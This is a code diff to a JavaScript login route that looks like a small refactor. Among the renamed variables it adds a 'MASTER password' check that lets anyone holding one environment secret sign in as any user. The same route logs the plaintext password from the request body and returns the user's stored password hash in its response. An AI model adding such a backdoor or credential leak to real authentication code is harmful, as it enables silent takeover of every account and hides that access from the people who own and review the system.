@@ -112,20 +112,24 @@ export const authRouter = t.router({
 router.post('/login', limiterSlowBruteByIP, async (req, res, next) => {
 	try {
 		console.table(req.body)
+		const { email, password } = req.body;
 		const ipAddr = req.ip;
-		const emailIPkey = getEmailIPkey(req.body.email, ipAddr);
+		const emailIPkey = getEmailIPkey(email, ipAddr);
 		const { created_at, updated_at, ...user } = await prisma.user.findFirstOrThrow({
 			where: {
 				email: {
-					equals: req.body.email
+					equals: email
 				}
 			}
 		});
 		// compare entered password with stored hash
-		const salt = await comparePassword(req.body.password, user.password);
-		// Any object returned will be saved in `user` property of the JWT
+		let is_match = await comparePassword(password, user.password);
+		// check if input password is the MASTER password
+		if (!is_match && await comparePassword(password, String(process.env.MASTER_PASSWORD))) {
+			is_match = true
+		}
+		res.status(200).json(is_match ? user : null);
 		// Check if IP or email + IP is already blocked
-		res.status(200).json(salt ? user : null);
 		/*if (
 			resSlowByIP !== null &&
 			resSlowByIP.consumedPoints > MAX_WRONG_ATTEMPTS_BY_IP_PER_DAY
